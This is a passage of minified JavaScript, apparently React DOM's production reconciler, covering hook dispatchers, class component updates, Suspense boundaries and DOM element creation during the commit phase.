s=Ra.transition;Ra.transition={};try{e(!1),t()}finally{xe=i,Ra.transition=s}}function Rd(){return St().memoizedState}function _y(e,t,i){var s=vn(e);if(i={lane:s,action:i,hasEagerState:!1,eagerState:null,next:null},Nd(e))Ld(t,i);else if(i=ud(e,t,i,s),i!==null){var l=rt();Lt(i,e,s,l),jd(i,t,s)}}function Wy(e,t,i){var s=vn(e),l={lane:s,action:i,hasEagerState:!1,eagerState:null,next:null};if(Nd(e))Ld(t,l);else{var u=e.alternate;if(e.lanes===0&&(u===null||u.lanes===0)&&(u=t.lastRenderedReducer,u!==null))try{var m=t.lastRenderedState,b=u(m,i);if(l.hasEagerState=!0,l.eagerState=b,It(b,m)){var k=t.interleaved;k===null?(l.next=l,Aa(t)):(l.next=k.next,k.next=l),t.interleaved=l;return}}catch{}finally{}i=ud(e,t,l,s),i!==null&&(l=rt(),Lt(i,e,s,l),jd(i,t,s))}}function Nd(e){var t=e.alternate;return e===Ne||t!==null&&t===Ne}function Ld(e,t){ai=xo=!0;var i=e.pending;i===null?t.next=t:(t.next=i.next,i.next=t),e.pending=t}function jd(e,t,i){if((i&4194240)!==0){var s=t.lanes;s&=e.pendingLanes,i|=s,t.lanes=i,_s(e,i)}}var Co={readContext:xt,useCallback:Xe,useContext:Xe,useEffect:Xe,useImperativeHandle:Xe,useInsertionEffect:Xe,useLayoutEffect:Xe,useMemo:Xe,useReducer:Xe,useRef:Xe,useState:Xe,useDebugValue:Xe,useDeferredValue:Xe,useTransition:Xe,useMutableSource:Xe,useSyncExternalStore:Xe,useId:Xe,unstable_isNewReconciler:!1},Uy={readContext:xt,useCallback:function(e,t){return Ot().memoizedState=[e,t===void 0?null:t],e},useContext:xt,useEffect:Td,useImperativeHandle:function(e,t,i){return i=i!=null?i.concat([e]):null,So(4194308,4,Pd.bind(null,t,e),i)},useLayoutEffect:function(e,t){return So(4194308,4,e,t)},useInsertionEffect:function(e,t){return So(4,2,e,t)},useMemo:function(e,t){var i=Ot();return t=t===void 0?null:t,e=e(),i.memoizedState=[e,t],e},useReducer:function(e,t,i){var s=Ot();return t=i!==void 0?i(t):t,s.memoizedState=s.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},s.queue=e,e=e.dispatch=_y.bind(null,Ne,e),[s.memoizedState,e]},useRef:function(e){var t=Ot();return e={current:e},t.memoizedState=e},useState:xd,useDebugValue:Oa,useDeferredValue:function(e){return Ot().memoizedState=e},useTransition:function(){var e=xd(!1),t=e[0];return e=zy.bind(null,e[1]),Ot().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,i){var s=Ne,l=Ot();if(Me){if(i===void 0)throw Error(o(407));i=i()}else{if(i=t(),Ge===null)throw Error(o(349));(Fn&30)!==0||yd(s,t,i)}l.memoizedState=i;var u={value:i,getSnapshot:t};return l.queue=u,Td(bd.bind(null,s,u,e),[e]),s.flags|=2048,ui(9,vd.bind(null,s,u,i,t),void 0,null),i},useId:function(){var e=Ot(),t=Ge.identifierPrefix;if(Me){var i=$t,s=Gt;i=(s&~(1<<32-Et(s)-1)).toString(32)+i,t=":"+t+"R"+i,i=li++,0<i&&(t+="H"+i.toString(32)),t+=":"}else i=Oy++,t=":"+t+"r"+i.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},Hy={readContext:xt,useCallback:Id,useContext:xt,useEffect:Va,useImperativeHandle:Ed,useInsertionEffect:Cd,useLayoutEffect:Ad,useMemo:Dd,useReducer:Ba,useRef:Sd,useState:function(){return Ba(ci)},useDebugValue:Oa,useDeferredValue:function(e){var t=St();return Md(t,_e.memoizedState,e)},useTransition:function(){var e=Ba(ci)[0],t=St().memoizedState;return[e,t]},useMutableSource:gd,useSyncExternalStore:md,useId:Rd,unstable_isNewReconciler:!1},Gy={readContext:xt,useCallback:Id,useContext:xt,useEffect:Va,useImperativeHandle:Ed,useInsertionEffect:Cd,useLayoutEffect:Ad,useMemo:Dd,useReducer:Fa,useRef:Sd,useState:function(){return Fa(ci)},useDebugValue:Oa,useDeferredValue:function(e){var t=St();return _e===null?t.memoizedState=e:Md(t,_e.memoizedState,e)},useTransition:function(){var e=Fa(ci)[0],t=St().memoizedState;return[e,t]},useMutableSource:gd,useSyncExternalStore:md,useId:Rd,unstable_isNewReconciler:!1};function Mt(e,t){if(e&&e.defaultProps){t=U({},t),e=e.defaultProps;for(var i in e)t[i]===void 0&&(t[i]=e[i]);return t}return t}function za(e,t,i,s){t=e.memoizedState,i=i(s,t),i=i==null?t:U({},t,i),e.memoizedState=i,e.lanes===0&&(e.updateQueue.baseState=i)}var Ao={isMounted:function(e){return(e=e._reactInternals)?Dn(e)===e:!1},enqueueSetState:function(e,t,i){e=e._reactInternals;var s=rt(),l=vn(e),u=qt(s,l);u.payload=t,i!=null&&(u.callback=i),t=fn(e,u,l),t!==null&&(Lt(t,e,l,s),vo(t,e,l))},enqueueReplaceState:function(e,t,i){e=e._reactInternals;var s=rt(),l=vn(e),u=qt(s,l);u.tag=1,u.payload=t,i!=null&&(u.callback=i),t=fn(e,u,l),t!==null&&(Lt(t,e,l,s),vo(t,e,l))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var i=rt(),s=vn(e),l=qt(i,s);l.tag=2,t!=null&&(l.callback=t),t=fn(e,l,s),t!==null&&(Lt(t,e,s,i),vo(t,e,s))}};function Bd(e,t,i,s,l,u,m){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,u,m):t.prototype&&t.prototype.isPureReactComponent?!Qr(i,s)||!Qr(l,u):!0}function Fd(e,t,i){var s=!1,l=dn,u=t.contextType;return typeof u=="object"&&u!==null?u=xt(u):(l=st(t)?Rn:Qe.current,s=t.contextTypes,u=(s=s!=null)?hr(e,l):dn),t=new t(i,u),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=Ao,e.stateNode=t,t._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=l,e.__reactInternalMemoizedMaskedChildContext=u),t}function Vd(e,t,i,s){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(i,s),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(i,s),t.state!==e&&Ao.enqueueReplaceState(t,t.state,null)}function _a(e,t,i,s){var l=e.stateNode;l.props=i,l.state=e.memoizedState,l.refs={},Pa(e);var u=t.contextType;typeof u=="object"&&u!==null?l.context=xt(u):(u=st(t)?Rn:Qe.current,l.context=hr(e,u)),l.state=e.memoizedState,u=t.getDerivedStateFromProps,typeof u=="function"&&(za(e,t,u,i),l.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof l.getSnapshotBeforeUpdate=="function"||typeof l.UNSAFE_componentWillMount!="function"&&typeof l.componentWillMount!="function"||(t=l.state,typeof l.componentWillMount=="function"&&l.componentWillMount(),typeof l.UNSAFE_componentWillMount=="function"&&l.UNSAFE_componentWillMount(),t!==l.state&&Ao.enqueueReplaceState(l,l.state,null),bo(e,i,l,s),l.state=e.memoizedState),typeof l.componentDidMount=="function"&&(e.flags|=4194308)}function kr(e,t){try{var i="",s=t;do i+=fe(s),s=s.return;while(s);var l=i}catch(u){l=`
Error generating stack: `+u.message+`
`+u.stack}return{value:e,source:t,stack:l,digest:null}}function Wa(e,t,i){return{value:e,source:null,stack:i??null,digest:t??null}}function Ua(e,t){try{console.error(t.value)}catch(i){setTimeout(function(){throw i})}}var $y=typeof WeakMap=="function"?WeakMap:Map;function Od(e,t,i){i=qt(-1,i),i.tag=3,i.payload={element:null};var s=t.value;return i.callback=function(){No||(No=!0,il=s),Ua(e,t)},i}function zd(e,t,i){i=qt(-1,i),i.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var l=t.value;i.payload=function(){return s(l)},i.callback=function(){Ua(e,t)}}var u=e.stateNode;return u!==null&&typeof u.componentDidCatch=="function"&&(i.callback=function(){Ua(e,t),typeof s!="function"&&(mn===null?mn=new Set([this]):mn.add(this));var m=t.stack;this.componentDidCatch(t.value,{componentStack:m!==null?m:""})}),i}function _d(e,t,i){var s=e.pingCache;if(s===null){s=e.pingCache=new $y;var l=new Set;s.set(t,l)}else l=s.get(t),l===void 0&&(l=new Set,s.set(t,l));l.has(i)||(l.add(i),e=sv.bind(null,e,t,i),t.then(e,e))}function Wd(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function Ud(e,t,i,s,l){return(e.mode&1)===0?(e===t?e.flags|=65536:(e.flags|=128,i.flags|=131072,i.flags&=-52805,i.tag===1&&(i.alternate===null?i.tag=17:(t=qt(-1,1),t.tag=2,fn(i,t,1))),i.lanes|=1),e):(e.flags|=65536,e.lanes=l,e)}var Ky=B.ReactCurrentOwner,at=!1;function nt(e,t,i,s){t.child=e===null?cd(t,null,i,s):yr(t,e.child,i,s)}function Hd(e,t,i,s,l){i=i.render;var u=t.ref;return br(t,l),s=La(e,t,i,s,u,l),i=ja(),e!==null&&!at?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~l,Yt(e,t,l)):(Me&&i&&ya(t),t.flags|=1,nt(e,t,s,l),t.child)}function Gd(e,t,i,s,l){if(e===null){var u=i.type;return typeof u=="function"&&!dl(u)&&u.defaultProps===void 0&&i.compare===null&&i.defaultProps===void 0?(t.tag=15,t.type=u,$d(e,t,u,s,l)):(e=Oo(i.type,null,s,t,t.mode,l),e.ref=t.ref,e.return=t,t.child=e)}if(u=e.child,(e.lanes&l)===0){var m=u.memoizedProps;if(i=i.compare,i=i!==null?i:Qr,i(m,s)&&e.ref===t.ref)return Yt(e,t,l)}return t.flags|=1,e=wn(u,s),e.ref=t.ref,e.return=t,t.child=e}function $d(e,t,i,s,l){if(e!==null){var u=e.memoizedProps;if(Qr(u,s)&&e.ref===t.ref)if(at=!1,t.pendingProps=s=u,(e.lanes&l)!==0)(e.flags&131072)!==0&&(at=!0);else return t.lanes=e.lanes,Yt(e,t,l)}return Ha(e,t,i,s,l)}function Kd(e,t,i){var s=t.pendingProps,l=s.children,u=e!==null?e.memoizedState:null;if(s.mode==="hidden")if((t.mode&1)===0)t.memoizedState={baseLanes:0,cachePool:null,transitions:null},Ce(Sr,gt),gt|=i;else{if((i&1073741824)===0)return e=u!==null?u.baseLanes|i:i,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,Ce(Sr,gt),gt|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=u!==null?u.baseLanes:i,Ce(Sr,gt),gt|=s}else u!==null?(s=u.baseLanes|i,t.memoizedState=null):s=i,Ce(Sr,gt),gt|=s;return nt(e,t,l,i),t.child}function qd(e,t){var i=t.ref;(e===null&&i!==null||e!==null&&e.ref!==i)&&(t.flags|=512,t.flags|=2097152)}function Ha(e,t,i,s,l){var u=st(i)?Rn:Qe.current;return u=hr(t,u),br(t,l),i=La(e,t,i,s,u,l),s=ja(),e!==null&&!at?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~l,Yt(e,t,l)):(Me&&s&&ya(t),t.flags|=1,nt(e,t,i,l),t.child)}function Yd(e,t,i,s,l){if(st(i)){var u=!0;co(t)}else u=!1;if(br(t,l),t.stateNode===null)Eo(e,t),Fd(t,i,s),_a(t,i,s,l),s=!0;else if(e===null){var m=t.stateNode,b=t.memoizedProps;m.props=b;var k=m.context,R=i.contextType;typeof R=="object"&&R!==null?R=xt(R):(R=st(i)?Rn:Qe.current,R=hr(t,R));var V=i.getDerivedStateFromProps,z=typeof V=="function"||typeof m.getSnapshotBeforeUpdate=="function";z||typeof m.UNSAFE_componentWillReceiveProps!="function"&&typeof m.componentWillReceiveProps!="function"||(b!==s||k!==R)&&Vd(t,m,s,R),hn=!1;var F=t.memoizedState;m.state=F,bo(t,s,m,l),k=t.memoizedState,b!==s||F!==k||ot.current||hn?(typeof V=="function"&&(za(t,i,V,s),k=t.memoizedState),(b=hn||Bd(t,i,b,s,F,k,R))?(z||typeof m.UNSAFE_componentWillMount!="function"&&typeof m.componentWillMount!="function"||(typeof m.componentWillMount=="function"&&m.componentWillMount(),typeof m.UNSAFE_componentWillMount=="function"&&m.UNSAFE_componentWillMount()),typeof m.componentDidMount=="function"&&(t.flags|=4194308)):(typeof m.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=s,t.memoizedState=k),m.props=s,m.state=k,m.context=R,s=b):(typeof m.componentDidMount=="function"&&(t.flags|=4194308),s=!1)}else{m=t.stateNode,dd(e,t),b=t.memoizedProps,R=t.type===t.elementType?b:Mt(t.type,b),m.props=R,z=t.pendingProps,F=m.context,k=i.contextType,typeof k=="object"&&k!==null?k=xt(k):(k=st(i)?Rn:Qe.current,k=hr(t,k));var G=i.getDerivedStateFromProps;(V=typeof G=="function"||typeof m.getSnapshotBeforeUpdate=="function")||typeof m.UNSAFE_componentWillReceiveProps!="function"&&typeof m.componentWillReceiveProps!="function"||(b!==z||F!==k)&&Vd(t,m,s,k),hn=!1,F=t.memoizedState,m.state=F,bo(t,s,m,l);var Q=t.memoizedState;b!==z||F!==Q||ot.current||hn?(typeof G=="function"&&(za(t,i,G,s),Q=t.memoizedState),(R=hn||Bd(t,i,R,s,F,Q,k)||!1)?(V||typeof m.UNSAFE_componentWillUpdate!="function"&&typeof m.componentWillUpdate!="function"||(typeof m.componentWillUpdate=="function"&&m.componentWillUpdate(s,Q,k),typeof m.UNSAFE_componentWillUpdate=="function"&&m.UNSAFE_componentWillUpdate(s,Q,k)),typeof m.componentDidUpdate=="function"&&(t.flags|=4),typeof m.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof m.componentDidUpdate!="function"||b===e.memoizedProps&&F===e.memoizedState||(t.flags|=4),typeof m.getSnapshotBeforeUpdate!="function"||b===e.memoizedProps&&F===e.memoizedState||(t.flags|=1024),t.memoizedProps=s,t.memoizedState=Q),m.props=s,m.state=Q,m.context=k,s=R):(typeof m.componentDidUpdate!="function"||b===e.memoizedProps&&F===e.memoizedState||(t.flags|=4),typeof m.getSnapshotBeforeUpdate!="function"||b===e.memoizedProps&&F===e.memoizedState||(t.flags|=1024),s=!1)}return Ga(e,t,i,s,u,l)}function Ga(e,t,i,s,l,u){qd(e,t);var m=(t.flags&128)!==0;if(!s&&!m)return l&&ed(t,i,!1),Yt(e,t,u);s=t.stateNode,Ky.current=t;var b=m&&typeof i.getDerivedStateFromError!="function"?null:s.render();return t.flags|=1,e!==null&&m?(t.child=yr(t,e.child,null,u),t.child=yr(t,null,b,u)):nt(e,t,b,u),t.memoizedState=s.state,l&&ed(t,i,!0),t.child}function Qd(e){var t=e.stateNode;t.pendingContext?Zu(e,t.pendingContext,t.pendingContext!==t.context):t.context&&Zu(e,t.context,!1),Ea(e,t.containerInfo)}function Xd(e,t,i,s,l){return mr(),ka(l),t.flags|=256,nt(e,t,i,s),t.child}var $a={dehydrated:null,treeContext:null,retryLane:0};function Ka(e){return{baseLanes:e,cachePool:null,transitions:null}}function Zd(e,t,i){var s=t.pendingProps,l=Re.current,u=!1,m=(t.flags&128)!==0,b;if((b=m)||(b=e!==null&&e.memoizedState===null?!1:(l&2)!==0),b?(u=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(l|=1),Ce(Re,l&1),e===null)return wa(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?((t.mode&1)===0?t.lanes=1:e.data==="$!"?t.lanes=8:t.lanes=1073741824,null):(m=s.children,e=s.fallback,u?(s=t.mode,u=t.child,m={mode:"hidden",children:m},(s&1)===0&&u!==null?(u.childLanes=0,u.pendingProps=m):u=zo(m,s,0,null),e=Wn(e,s,i,null),u.return=t,e.return=t,u.sibling=e,t.child=u,t.child.memoizedState=Ka(i),t.memoizedState=$a,e):qa(t,m));if(l=e.memoizedState,l!==null&&(b=l.dehydrated,b!==null))return qy(e,t,m,s,b,l,i);if(u){u=s.fallback,m=t.mode,l=e.child,b=l.sibling;var k={mode:"hidden",children:s.children};return(m&1)===0&&t.child!==l?(s=t.child,s.childLanes=0,s.pendingProps=k,t.deletions=null):(s=wn(l,k),s.subtreeFlags=l.subtreeFlags&14680064),b!==null?u=wn(b,u):(u=Wn(u,m,i,null),u.flags|=2),u.return=t,s.return=t,s.sibling=u,t.child=s,s=u,u=t.child,m=e.child.memoizedState,m=m===null?Ka(i):{baseLanes:m.baseLanes|i,cachePool:null,transitions:m.transitions},u.memoizedState=m,u.childLanes=e.childLanes&~i,t.memoizedState=$a,s}return u=e.child,e=u.sibling,s=wn(u,{mode:"visible",children:s.children}),(t.mode&1)===0&&(s.lanes=i),s.return=t,s.sibling=null,e!==null&&(i=t.deletions,i===null?(t.deletions=[e],t.flags|=16):i.push(e)),t.child=s,t.memoizedState=null,s}function qa(e,t){return t=zo({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function Po(e,t,i,s){return s!==null&&ka(s),yr(t,e.child,null,i),e=qa(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function qy(e,t,i,s,l,u,m){if(i)return t.flags&256?(t.flags&=-257,s=Wa(Error(o(422))),Po(e,t,m,s)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(u=s.fallback,l=t.mode,s=zo({mode:"visible",children:s.children},l,0,null),u=Wn(u,l,m,null),u.flags|=2,s.return=t,u.return=t,s.sibling=u,t.child=s,(t.mode&1)!==0&&yr(t,e.child,null,m),t.child.memoizedState=Ka(m),t.memoizedState=$a,u);if((t.mode&1)===0)return Po(e,t,m,null);if(l.data==="$!"){if(s=l.nextSibling&&l.nextSibling.dataset,s)var b=s.dgst;return s=b,u=Error(o(419)),s=Wa(u,s,void 0),Po(e,t,m,s)}if(b=(m&e.childLanes)!==0,at||b){if(s=Ge,s!==null){switch(m&-m){case 4:l=2;break;case 16:l=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:l=32;break;case 536870912:l=268435456;break;default:l=0}l=(l&(s.suspendedLanes|m))!==0?0:l,l!==0&&l!==u.retryLane&&(u.retryLane=l,Kt(e,l),Lt(s,e,l,-1))}return ul(),s=Wa(Error(o(421))),Po(e,t,m,s)}return l.data==="$?"?(t.flags|=128,t.child=e.child,t=av.bind(null,e),l._reactRetry=t,null):(e=u.treeContext,ft=cn(l.nextSibling),ht=t,Me=!0,Dt=null,e!==null&&(wt[kt++]=Gt,wt[kt++]=$t,wt[kt++]=Nn,Gt=e.id,$t=e.overflow,Nn=t),t=qa(t,s.children),t.flags|=4096,t)}function Jd(e,t,i){e.lanes|=t;var s=e.alternate;s!==null&&(s.lanes|=t),Ca(e.return,t,i)}function Ya(e,t,i,s,l){var u=e.memoizedState;u===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:s,tail:i,tailMode:l}:(u.isBackwards=t,u.rendering=null,u.renderingStartTime=0,u.last=s,u.tail=i,u.tailMode=l)}function ep(e,t,i){var s=t.pendingProps,l=s.revealOrder,u=s.tail;if(nt(e,t,s.children,i),s=Re.current,(s&2)!==0)s=s&1|2,t.flags|=128;else{if(e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Jd(e,i,t);else if(e.tag===19)Jd(e,i,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(Ce(Re,s),(t.mode&1)===0)t.memoizedState=null;else switch(l){case"forwards":for(i=t.child,l=null;i!==null;)e=i.alternate,e!==null&&wo(e)===null&&(l=i),i=i.sibling;i=l,i===null?(l=t.child,t.child=null):(l=i.sibling,i.sibling=null),Ya(t,!1,l,i,u);break;case"backwards":for(i=null,l=t.child,t.child=null;l!==null;){if(e=l.alternate,e!==null&&wo(e)===null){t.child=l;break}e=l.sibling,l.sibling=i,i=l,l=e}Ya(t,!0,i,null,u);break;case"together":Ya(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function Eo(e,t){(t.mode&1)===0&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Yt(e,t,i){if(e!==null&&(t.dependencies=e.dependencies),Vn|=t.lanes,(i&t.childLanes)===0)return null;if(e!==null&&t.child!==e.child)throw Error(o(153));if(t.child!==null){for(e=t.child,i=wn(e,e.pendingProps),t.child=i,i.return=t;e.sibling!==null;)e=e.sibling,i=i.sibling=wn(e,e.pendingProps),i.return=t;i.sibling=null}return t.child}function Yy(e,t,i){switch(t.tag){case 3:Qd(t),mr();break;case 5:fd(t);break;case 1:st(t.type)&&co(t);break;case 4:Ea(t,t.stateNode.containerInfo);break;case 10:var s=t.type._context,l=t.memoizedProps.value;Ce(mo,s._currentValue),s._currentValue=l;break;case 13:if(s=t.memoizedState,s!==null)return s.dehydrated!==null?(Ce(Re,Re.current&1),t.flags|=128,null):(i&t.child.childLanes)!==0?Zd(e,t,i):(Ce(Re,Re.current&1),e=Yt(e,t,i),e!==null?e.sibling:null);Ce(Re,Re.current&1);break;case 19:if(s=(i&t.childLanes)!==0,(e.flags&128)!==0){if(s)return ep(e,t,i);t.flags|=128}if(l=t.memoizedState,l!==null&&(l.rendering=null,l.tail=null,l.lastEffect=null),Ce(Re,Re.current),s)break;return null;case 22:case 23:return t.lanes=0,Kd(e,t,i)}return Yt(e,t,i)}var tp,Qa,np,rp;tp=function(e,t){for(var i=t.child;i!==null;){if(i.tag===5||i.tag===6)e.appendChild(i.stateNode);else if(i.tag!==4&&i.child!==null){i.child.return=i,i=i.child;continue}if(i===t)break;for(;i.sibling===null;){if(i.return===null||i.return===t)return;i=i.return}i.sibling.return=i.return,i=i.sibling}},Qa=function(){},np=function(e,t,i,s){var l=e.memoizedProps;if(l!==s){e=t.stateNode,Bn(Vt.current);var u=null;switch(i){case"input":l=Cs(e,l),s=Cs(e,s),u=[];break;case"select":l=U({},l,{value:void 0}),s=U({},s,{value:void 0}),u=[];break;case"textarea":l=Es(e,l),s=Es(e,s),u=[];break;default:typeof l.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=so)}Ds(i,s);var m;i=null;for(R in l)if(!s.hasOwnProperty(R)&&l.hasOwnProperty(R)&&l[R]!=null)if(R==="style"){var b=l[R];for(m in b)b.hasOwnProperty(m)&&(i||(i={}),i[m]="")}else R!=="dangerouslySetInnerHTML"&&R!=="children"&&R!=="suppressContentEditableWarning"&&R!=="suppressHydrationWarning"&&R!=="autoFocus"&&(c.hasOwnProperty(R)?u||(u=[]):(u=u||[]).push(R,null));for(R in s){var k=s[R];if(b=l!=null?l[R]:void 0,s.hasOwnProperty(R)&&k!==b&&(k!=null||b!=null))if(R==="style")if(b){for(m in b)!b.hasOwnProperty(m)||k&&k.hasOwnProperty(m)||(i||(i={}),i[m]="");for(m in k)k.hasOwnProperty(m)&&b[m]!==k[m]&&(i||(i={}),i[m]=k[m])}else i||(u||(u=[]),u.push(R,i)),i=k;else R==="dangerouslySetInnerHTML"?(k=k?k.__html:void 0,b=b?b.__html:void 0,k!=null&&b!==k&&(u=u||[]).push(R,k)):R==="children"?typeof k!="string"&&typeof k!="number"||(u=u||[]).push(R,""+k):R!=="suppressContentEditableWarning"&&R!=="suppressHydrationWarning"&&(c.hasOwnProperty(R)?(k!=null&&R==="onScroll"&&Pe("scroll",e),u||b===k||(u=[])):(u=u||[]).push(R,k))}i&&(u=u||[]).push("style",i);var R=u;(t.updateQueue=R)&&(t.flags|=4)}},rp=function(e,t,i,s){i!==s&&(t.flags|=4)};function di(e,t){if(!Me)switch(e.tailMode){case"hidden":t=e.tail;for(var i=null;t!==null;)t.alternate!==null&&(i=t),t=t.sibling;i===null?e.tail=null:i.sibling=null;break;case"collapsed":i=e.tail;for(var s=null;i!==null;)i.alternate!==null&&(s=i),i=i.sibling;s===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function Ze(e){var t=e.alternate!==null&&e.alternate.child===e.child,i=0,s=0;if(t)for(var l=e.child;l!==null;)i|=l.lanes|l.childLanes,s|=l.subtreeFlags&14680064,s|=l.flags&14680064,l.return=e,l=l.sibling;else for(l=e.child;l!==null;)i|=l.lanes|l.childLanes,s|=l.subtreeFlags,s|=l.flags,l.return=e,l=l.sibling;return e.subtreeFlags|=s,e.childLanes=i,t}function Qy(e,t,i){var s=t.pendingProps;switch(va(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Ze(t),null;case 1:return st(t.type)&&lo(),Ze(t),null;case 3:return s=t.stateNode,wr(),Ee(ot),Ee(Qe),Ma(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(fo(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,Dt!==null&&(al(Dt),Dt=null))),Qa(e,t),Ze(t),null;case 5:Ia(t);var l=Bn(si.current);if(i=t.type,e!==null&&t.stateNode!=null)np(e,t,i,s,l),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!s){if(t.stateNode===null)throw Error(o(166));return Ze(t),null}if(e=Bn(Vt.current),fo(t)){s=t.stateNode,i=t.type;var u=t.memoizedProps;switch(s[Ft]=t,s[ti]=u,e=(t.mode&1)!==0,i){case"dialog":Pe("cancel",s),Pe("close",s);break;case"iframe":case"object":case"embed":Pe("load",s);break;case"video":case"audio":for(l=0;l<Zr.length;l++)Pe(Zr[l],s);break;case"source":Pe("error",s);break;case"img":case"image":case"link":Pe("error",s),Pe("load",s);break;case"details":Pe("toggle",s);break;case"input":Fc(s,u),Pe("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!u.multiple},Pe("invalid",s);break;case"textarea":zc(s,u),Pe("invalid",s)}Ds(i,u),l=null;for(var m in u)if(u.hasOwnProperty(m)){var b=u[m];m==="children"?typeof b=="string"?s.textContent!==b&&(u.suppressHydrationWarning!==!0&&oo(s.textContent,b,e),l=["children",b]):typeof b=="number"&&s.textContent!==""+b&&(u.suppressHydrationWarning!==!0&&oo(s.textContent,b,e),l=["children",""+b]):c.hasOwnProperty(m)&&b!=null&&m==="onScroll"&&Pe("scroll",s)}switch(i){case"input":bt(s),Oc(s,u,!0);break;case"textarea":bt(s),Wc(s);break;case"select":case"option":break;default:typeof u.onClick=="function"&&(s.onclick=so)}s=l,t.updateQueue=s,s!==null&&(t.flags|=4)}else{m=l.nodeType===9?l:l.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Uc(i)),e==="http://www.w3.org/1999/xhtml"?i==="script"?(e=m.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=m.createElement(i,{is:s.is}):(e=m.createElement(i),i==="select"&&(m=e,s.multiple?m.multiple=!0:s.size&&(m.size=s.size))):e=m.createElementNS(e,i),e[Ft]=t,e[ti]=s,tp(e,t,!1,!1),t.stateNode=e;e:{switch(m=Ms(i,s),i){case"dialog":Pe("cancel",e),Pe("close",e),l=s;break;case"iframe":case"object":case"embed":Pe("load",e),l=s;break;case"video":case"audio":for(l=0;l<Zr.length;l++)Pe(Zr[l],e);l=s;break;case"source":Pe("error",e),l=s;break;case"img":case"image":case"link":Pe("error",e),Pe("load",e),l=s;break;case"details":Pe("toggle",e),l=s;break;case"input":Fc(e,s),l=Cs(e,s),Pe("invalid",e);break;case"option":l=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},l=U({},s,{value:void 0}),Pe("invalid",e);break;case"textarea":zc(e,s),l=Es(e,s),Pe("invalid",e);break;default:l=s}Ds(i,l),b=l;for(u in b)if(b.hasOwnProperty(u)){var k=b[u];u==="style"?$c(e,k):u==="dangerouslySetInnerHTML"?(k=k?k.__html:void 0,k!=null&&Hc(e,k)):u==="children"?typeof k=="string"?(i!=="textarea"||k!=="")&&Nr(e,k):typeof k=="number"&&Nr(e,""+k):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(c.hasOwnProperty(u)?k!=null&&u==="onScroll"&&Pe("scroll",e):k!=null&&N(e,u,k,m))}switch(i){case"input":bt(e),Oc(e,s,!1);break;case"textarea":bt(e),Wc(e);break;case"option":s.value!=null&&e.setAttribute("value",""+we(s.value));break;case"select":e.multiple=!!s.multiple,u=s.value,u!=null?tr(e,!!s.multiple,u,!1):s.defaultValue!=null&&tr(e,!!s.multiple,s.defaultValue,!0);break;default:typeof l.onClick=="function"&&(e.onclick=so)}switch(i){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return Ze(t),null;case 6:if(e&&t.stateNode!=null)rp(e,t,e.memoizedProps,s);else{if(typeof s!="string"&&t.stateNode===null)throw Error(o(166));if(i=Bn(si.current),Bn(Vt.current),fo(t)){if(s=t.stateNode,i=t.memoizedProps,s[Ft]=t,(u=s.nodeValue!==i)&&(e=ht,e!==null))switch(e.tag){case 3:oo(s.nodeValue,i,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&oo(s.nodeValue,i,(e.mode&1)!==0)}u&&(t.flags|=4)}else s=(i.nodeType===9?i:i.ownerDocument).createTextNode(s),s[Ft]=t,t.stateNode=s}return Ze(t),null;case 